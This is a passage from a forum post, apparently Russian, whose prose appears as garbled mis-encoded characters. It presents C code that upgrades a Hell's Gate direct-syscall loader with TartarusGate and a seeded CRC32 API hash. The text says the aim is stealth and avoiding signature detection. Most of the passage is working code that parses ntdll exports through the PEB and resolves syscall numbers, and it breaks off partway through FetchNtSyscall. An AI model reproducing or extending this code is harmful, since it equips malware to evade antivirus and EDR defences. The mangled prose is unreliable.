–û–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å–¥–µ–ª–∞—é—Ç —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é –±–æ–ª–µ–µ –Ω–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º–æ–π –∏, —Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ, –±–æ–ª–µ–µ —Å–∫—Ä—ã—Ç–Ω–æ–π –∏ —É–º–µ–Ω—å—à–∞—Ç –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –Ω–∞ –æ—Å–Ω–æ–≤–µ —Å–∏–≥–Ω–∞—Ç—É—Ä. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, –æ–±–Ω–æ–≤–ª–µ–Ω–Ω—ã–π –∫–æ–¥ –∏–∑–º–µ–Ω–∏—Ç —Å–ø–æ—Å–æ–± –ø–æ–ª—É—á–µ–Ω–∏—è SSN —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∏—Å–ø–æ–ª—å–∑—É—è <a href="https://github.com/trickster0/TartarusGate" target="_blank" class="link link--external" rel="noopener">–º–µ—Ç–æ–¥ TartarusGate.</a><br />
<br />
–ï—Å–ª–∏ –≤–∞–º –Ω—É–∂–Ω–æ –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–µ—Ä–≤–æ–Ω–∞—á–∞–ª—å–Ω–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ Hell&#039;s Gate, –ø–æ—Å–µ—Ç–∏—Ç–µ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π <a href="https://github.com/am0nsec/HellsGate" target="_blank" class="link link--external" rel="noopener">Hell&#039;s Gate –Ω–∞ GitHub.</a><br />
<br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∞–ª–≥–æ—Ä–∏—Ç–º–∞ —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫</b><br />
<br />
–ü–µ—Ä–≤–æ–Ω–∞—á–∞–ª—å–Ω–∞—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è Hell&#039;s Gate –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∞ –∞–ª–≥–æ—Ä–∏—Ç–º —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫ DJB2. –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∞–ª–≥–æ—Ä–∏—Ç–º–∞ —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫ –Ω–µ –≤–ª–∏—è–µ—Ç –Ω–∞ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é Hell&#039;s Gate, –Ω–æ –∏–∑–º–µ–Ω–µ–Ω–∏–µ –∞–ª–≥–æ—Ä–∏—Ç–º–∞ —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫ –≤–µ—Ä–æ—è—Ç–Ω–æ —É–º–µ–Ω—å—à–∏—Ç –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è —Å–∏–≥–Ω–∞—Ç—É—Ä. –§—É–Ω–∫—Ü–∏—è djb2 –∑–∞–º–µ–Ω—è–µ—Ç—Å—è —Å–ª–µ–¥—É—é—â–µ–π —Ñ—É–Ω–∫—Ü–∏–µ–π.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>unsigned int crc32h(char* message) {
    int i, crc;
    unsigned int byte, c;
    const unsigned int g0 = SEED, g1 = g0 &gt;&gt; 1,
        g2 = g0 &gt;&gt; 2, g3 = g0 &gt;&gt; 3, g4 = g0 &gt;&gt; 4, g5 = g0 &gt;&gt; 5,
        g6 = (g0 &gt;&gt; 6) ^ g0, g7 = ((g0 &gt;&gt; 6) ^ g0) &gt;&gt; 1;

    i = 0;
    crc = 0xFFFFFFFF;
    while ((byte = message[i]) != 0) {    // –ü–æ–ª—É—á–∏—Ç—å —Å–ª–µ–¥—É—é—â–∏–π –±–∞–π—Ç.
        crc = crc ^ byte;
        c = ((crc &lt;&lt; 31 &gt;&gt; 31) &amp; g7) ^ ((crc &lt;&lt; 30 &gt;&gt; 31) &amp; g6) ^
            ((crc &lt;&lt; 29 &gt;&gt; 31) &amp; g5) ^ ((crc &lt;&lt; 28 &gt;&gt; 31) &amp; g4) ^
            ((crc &lt;&lt; 27 &gt;&gt; 31) &amp; g3) ^ ((crc &lt;&lt; 26 &gt;&gt; 31) &amp; g2) ^
            ((crc &lt;&lt; 25 &gt;&gt; 31) &amp; g1) ^ ((crc &lt;&lt; 24 &gt;&gt; 31) &amp; g0);
        crc = ((unsigned)crc &gt;&gt; 8) ^ c;
        i = i + 1;
    }
    return ~crc;
}</code></pre>
	</div>
</div><br />
–§—É–Ω–∫—Ü–∏—è crc32h –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é –∞–ª–≥–æ—Ä–∏—Ç–º–∞ —Ö—ç—à–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Ç—Ä–æ–∫ Cyclic Redundancy Check (CRC32) –∏ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –≤ —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ. –î–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è —á–∏—Ç–∞–µ–º–æ—Å—Ç–∏ –∏ –æ–±—Å–ª—É–∂–∏–≤–∞–µ–º–æ—Å—Ç–∏ –∫–æ–¥–∞ —Ñ—É–Ω–∫—Ü–∏—è crc32h –±—É–¥–µ—Ç –≤—ã–∑—ã–≤–∞—Ç—å—Å—è —á–µ—Ä–µ–∑ —Å–ª–µ–¥—É—é—â—É—é –º–∞–∫—Ä–æ—Å–æ–≤—É—é –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define HASH(API) crc32h((char*)API)</code></pre>
	</div>
</div><br />
–ì–¥–µ –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è API - —ç—Ç–æ —Å—Ç—Ä–æ–∫–∞, –∫–æ—Ç–æ—Ä—É—é –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Ö—ç—à–∏—Ä–æ–≤–∞—Ç—å —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º crc32h.<br />
<br />
<b>–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ GetVxTableEntry<br />
<br />
–°–æ–∑–¥–∞–Ω–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã NTDLL_CONFIG</b><br />
<br />
–ù–∞–ø–æ–º–Ω–∏–º, —á—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è GetVxTableEntry –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞ –∏ SSN (–Ω–æ–º–µ—Ä–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞) —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –µ–≥–æ —Ö—ç—à-–∑–Ω–∞—á–µ–Ω–∏—è. –§—É–Ω–∫—Ü–∏—è GetVxTableEntry –≤—ã—á–∏—Å–ª—è–µ—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ RVAs (–æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω—ã–µ –∞–¥—Ä–µ—Å–∞) –¥–ª—è –ø–æ–∏—Å–∫–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ —Ö—ç—à–∞ –∏ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –¥–≤–∞ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–∞, pModuleBase –∏ pImageExportDirectory, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ —Å–≤—è–∑–∞–Ω—ã —Å –µ–µ –Ω–∞–∑–Ω–∞—á–µ–Ω–∏–µ–º. –î–ª—è —É–ª—É—á—à–µ–Ω–∏—è —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ —Å–æ–∑–¥–∞–µ—Ç—Å—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ NTDLL_CONFIG, –∫–æ—Ç–æ—Ä–∞—è –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∞ –Ω–∏–∂–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _NTDLL_CONFIG
{
    PDWORD      pdwArrayOfAddresses; // VA –º–∞—Å—Å–∏–≤–∞ –∞–¥—Ä–µ—Å–æ–≤ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ–º—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π ntdll
    PDWORD      pdwArrayOfNames;     // VA –º–∞—Å—Å–∏–≤–∞ –∏–º–µ–Ω —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ–º—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π ntdll
    PWORD       pwArrayOfOrdinals;   // VA –º–∞—Å—Å–∏–≤–∞ –ø–æ—Ä—è–¥–∫–æ–≤—ã—Ö –Ω–æ–º–µ—Ä–æ–≤ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ–º—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π ntdll
    DWORD       dwNumberOfNames;     // –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ–º—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π –∏–∑ ntdll.dll
    ULONG_PTR   uModule;             // –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å ntdll - –Ω–µ–æ–±—Ö–æ–¥–∏–º –¥–ª—è –≤—ã—á–∏—Å–ª–µ–Ω–∏—è –±—É–¥—É—â–∏—Ö RVAs

} NTDLL_CONFIG, *PNTDLL_CONFIG;

// –ì–ª–æ–±–∞–ª—å–Ω–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è
NTDLL_CONFIG g_NtdllConf = { 0 };</code></pre>
	</div>
</div><br />
<b>–°–æ–∑–¥–∞–Ω–∏–µ InitNtdllConfigStructure</b><br />
<br />
–ö—Ä–æ–º–µ —Ç–æ–≥–æ, —Å–æ–∑–¥–∞–µ—Ç—Å—è –ø—Ä–∏–≤–∞—Ç–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è InitNtdllConfigStructure, –∫–æ—Ç–æ—Ä–∞—è –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏–µ–π GetVxTableEntry –¥–ª—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –≥–ª–æ–±–∞–ª—å–Ω–æ–π —Å—Ç—Ä—É–∫—Ç—É—Ä—ã g_NtdllConf. –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç GetVxTableEntry –æ–±—Ä–∞—â–∞—Ç—å—Å—è –∫ –∑–Ω–∞—á–µ–Ω–∏—è–º –∏–∑ –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤ NTDLL –±–µ–∑ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –∏–ª–∏ –≤—ã—á–∏—Å–ª–µ–Ω–∏–π –∫–∞–∂–¥—ã–π —Ä–∞–∑. –í —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ —Ñ—É–Ω–∫—Ü–∏—è InitNtdllConfigStructure –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ—Ç —Å—Ç—Ä—É–∫—Ç—É—Ä—É g_NtdllConf –¥–ª—è –±—É–¥—É—â–µ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è.<br />
<br />
–§—É–Ω–∫—Ü–∏—è InitNtdllConfigStructure –ø–æ–ª—É—á–∞–µ—Ç –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å NTDLL –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç —Ä–∞–∑–±–æ—Ä PE (Portable Executable) –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ —ç–∫—Å–ø–æ—Ä—Ç–∞. –ó–∞—Ç–µ–º —Ñ—É–Ω–∫—Ü–∏—è –≤—ã—á–∏—Å–ª—è–µ—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ RVAs –¥–ª—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è —Å—Ç—Ä—É–∫—Ç—É—Ä—ã g_NtdllConf –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏. –§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç TRUE, –µ—Å–ª–∏ –æ–Ω–∞ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω—è–µ—Ç —ç—Ç–∏ –¥–µ–π—Å—Ç–≤–∏—è, –∏ FALSE, –µ—Å–ª–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ g_NtdllConf –≤—Å–µ –µ—â–µ —Å–æ–¥–µ—Ä–∂–∏—Ç –Ω–µ–∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InitNtdllConfigStructure() {

    // –ü–æ–ª—É—á–µ–Ω–∏–µ PEB (Process Environment Block)
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb || pPeb-&gt;OSMajorVersion != 0xA)
        return FALSE;

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –º–æ–¥—É–ª—è ntdll.dll
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –±–∞–∑–æ–≤–æ–≥–æ –∞–¥—Ä–µ—Å–∞ ntdll
    ULONG_PTR uModule = (ULONG_PTR)(pLdr-&gt;DllBase);
    if (!uModule)
        return FALSE;

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∑–∞–≥–æ–ª–æ–≤–∫–∞ DOS –¥–ª—è ntdll
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)uModule;
    if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤ NT –¥–ª—è ntdll
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + pImgDosHdr-&gt;e_lfanew);
    if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    // –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ —ç–∫—Å–ø–æ—Ä—Ç–∞ –¥–ª—è ntdll
    PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uModule + pImgNtHdrs-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!pImgExpDir)
        return FALSE;

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —ç–ª–µ–º–µ–Ω—Ç–æ–≤ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã &#039;g_NtdllConf&#039;
    g_NtdllConf.uModule             = uModule;
    g_NtdllConf.dwNumberOfNames     = pImgExpDir-&gt;NumberOfNames;
    g_NtdllConf.pdwArrayOfNames     = (PDWORD)(uModule + pImgExpDir-&gt;AddressOfNames);
    g_NtdllConf.pdwArrayOfAddresses = (PDWORD)(uModule + pImgExpDir-&gt;AddressOfFunctions);
    g_NtdllConf.pwArrayOfOrdinals   = (PWORD)(uModule  + pImgExpDir-&gt;AddressOfNameOrdinals);

    // –ü—Ä–æ–≤–µ—Ä–∫–∞
    if (!g_NtdllConf.uModule || !g_NtdllConf.dwNumberOfNames || !g_NtdllConf.pdwArrayOfNames || !g_NtdllConf.pdwArrayOfAddresses || !g_NtdllConf.pwArrayOfOrdinals)
        return FALSE;
    else
        return TRUE;
}</code></pre>
	</div>
</div><br />
<b>–ü–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–∏–µ –∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ GetVxTableEntry</b><br />
<br />
GetVxTableEntry –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–∞ –≤ FetchNtSyscall –∏ –±—É–¥–µ—Ç –∏–º–µ—Ç—å –¥–≤–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞: dwSysHash, —Ö—ç—à-–∑–Ω–∞—á–µ–Ω–∏–µ —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è SSN, –∏ pNtSys, —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä—É NT_SYSCALL, –∫–æ—Ç–æ—Ä–∞—è —Å–æ–¥–µ—Ä–∂–∏—Ç –≤—Å—é –Ω–µ–æ–±—Ö–æ–¥–∏–º—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä—è–º–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞. –≠—Ç–∞ —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –±—É–¥–µ—Ç –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–∞ —Ñ—É–Ω–∫—Ü–∏–µ–π FetchNtSyscall.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _NT_SYSCALL
{
    DWORD dwSSn;                    // –Ω–æ–º–µ—Ä —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞
    DWORD dwSyscallHash;            // —Ö—ç—à-–∑–Ω–∞—á–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞
    PVOID pSyscallAddress;          // –∞–¥—Ä–µ—Å —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞

} NT_SYSCALL, *PNT_SYSCALL;</code></pre>
	</div>
</div><br />
<b>–§—É–Ω–∫—Ü–∏—è FetchNtSyscall –≤—ã–ø–æ–ª–Ω—è–µ—Ç —Å–ª–µ–¥—É—é—â–∏–µ –¥–µ–π—Å—Ç–≤–∏—è:</b><br />
<br />
–ü—Ä–æ–≤–µ—Ä—è–µ—Ç, –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–∞ –ª–∏ –≥–ª–æ–±–∞–ª—å–Ω–∞—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ g_NtdllConf. –ï—Å–ª–∏ –Ω–µ—Ç, –æ–Ω–∞ –≤—ã–∑—ã–≤–∞–µ—Ç InitNtdllConfigStructure –¥–ª—è –µ–µ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏. –ü—Ä–æ–≤–µ—Ä—è–µ—Ç, —É–∫–∞–∑–∞–ª –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Ö—ç—à-–∑–Ω–∞—á–µ–Ω–∏–µ, –∏–Ω–∞—á–µ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç FALSE. –ò–Ω–∏—Ü–∏–∏—Ä—É–µ—Ç —Ü–∏–∫–ª for –¥–ª—è –ø–æ–∏—Å–∫–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –ø–æ –µ–≥–æ —Ö—ç—à-–∑–Ω–∞—á–µ–Ω–∏—é. –ö–æ–≥–¥–∞ —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –Ω–∞–π–¥–µ–Ω, –æ–Ω —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –µ–≥–æ –∞–¥—Ä–µ—Å –≤ —Å—Ç—Ä—É–∫—Ç—É—Ä–µ pNtSys. –ó–∞—Ç–µ–º –∏–Ω–∏—Ü–∏–∏—Ä—É–µ—Ç —Ü–∏–∫–ª while –¥–ª—è –ø–æ–∏—Å–∫–∞ SSN —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞. –õ–æ–≥–∏–∫–∞ –ø–æ–∏—Å–∫–∞ —Ç–∞–∫–∞—è –∂–µ, –∫–∞–∫ –∏ –≤ –∏—Å—Ö–æ–¥–Ω–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏. –ï—Å–ª–∏ SSN –Ω–∞–π–¥–µ–Ω, –æ–Ω —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç—Å—è –≤ —Å—Ç—Ä—É–∫—Ç—É—Ä–µ pNtSys. –ó–∞—Ç–µ–º —Ñ—É–Ω–∫—Ü–∏—è –≤—ã—Ö–æ–¥–∏—Ç –∏–∑ –æ–±–æ–∏—Ö —Ü–∏–∫–ª–æ–≤ –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç –æ–∫–æ–Ω—á–∞—Ç–µ–ª—å–Ω—É—é –ø—Ä–æ–≤–µ—Ä–∫—É, —á—Ç–æ–±—ã —É–±–µ–¥–∏—Ç—å—Å—è, —á—Ç–æ –≤—Å–µ —ç–ª–µ–º–µ–Ω—Ç—ã —Å—Ç—Ä—É–∫—Ç—É—Ä—ã NT_SYSCALL –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω—ã. –†–µ–∑—É–ª—å—Ç–∞—Ç –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç—Å—è –ø–æ—Å–ª–µ —ç—Ç–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ ntdll, –µ—Å–ª–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞
    if (!g_NtdllConf.uModule) {
        if (!InitNtdllConfigStructure())
            return FALSE;
    }

    // –ï—Å–ª–∏ –Ω–µ —É–∫–∞–∑–∞–Ω–æ —Ö—ç—à-–∑–Ω–∞—á–µ–Ω–∏–µ
    if (dwSysHash != NULL)
        pNtSys-&gt;dwSyscallHash = dwSysHash;
    else
        return FALSE;

    // –ü–æ–∏—Å–∫ &#039;dwSysHash&#039; –≤ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ–º—ã—Ö —Ñ—É–Ω–∫—Ü–∏—è—Ö ntdll
    for (size_t i = 0; i &lt; g_NtdllConf.dwNumberOfNames; i++) {

        PCHAR pcFuncName   = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
        PVOID pFuncAddress = (PVOID)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);

        // –ï—Å–ª–∏ —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –Ω–∞–π–¥–µ–Ω
        if (HASH(pcFuncName) == dwSysHash) {

            // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞
            pNtSys-&gt;pSyscallAddress = pFuncAddress;

            WORD cw = 0;

            // –ü–æ–∏—Å–∫ SSN
            while (TRUE) {

                // –î–æ—Å—Ç–∏–≥–ª–∏ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ &#039;ret&#039; - –º—ã –Ω–∞—Ö–æ–¥–∏–º—Å—è –¥–∞–ª–µ–∫–æ –≤–Ω–∏–∑—É
                if (*((PBYTE)pFuncAddress + cw) == 0xC3 &amp;&amp; !pNtSys-&gt;dwSSn)
                    return FALSE;

                // –î–æ—Å—Ç–∏–≥–ª–∏ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ &#039;syscall&#039; - –º—ã –Ω–∞—Ö–æ–¥–∏–º—Å—è –¥–∞–ª–µ–∫–æ –≤–Ω–∏–∑—É
                if (*((PBYTE)pFuncAddress + cw) == 0x0F &amp;&amp; *((PBYTE)pFuncAddress + cw + 1) == 0x05 &amp;&amp; !pNtSys-&gt;dwSSn)
                    return FALSE;

                if (*((PBYTE)pFuncAddress + cw) == 0x4C
                    &amp;&amp; *((PBYTE)pFuncAddress + 1 + cw) == 0x8B
                    &amp;&amp; *((PBYTE)pFuncAddress + 2 + cw) == 0xD1
                    &amp;&amp; *((PBYTE)pFuncAddress + 3 + cw) == 0xB8
                    &amp;&amp; *((PBYTE)pFuncAddress + 6 + cw) == 0x00
                    &amp;&amp; *((PBYTE)pFuncAddress + 7 + cw) == 0x00) {

                    BYTE high = *((PBYTE)pFuncAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFuncAddress + 4 + cw);
                    // –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ SSN
                    pNtSys-&gt;dwSSn = (high &lt;&lt; 8) | low;
                    break; // –í—ã—Ö–æ–¥ –∏–∑ —Ü–∏–∫–ª–∞ while
                }

                cw++;
            }

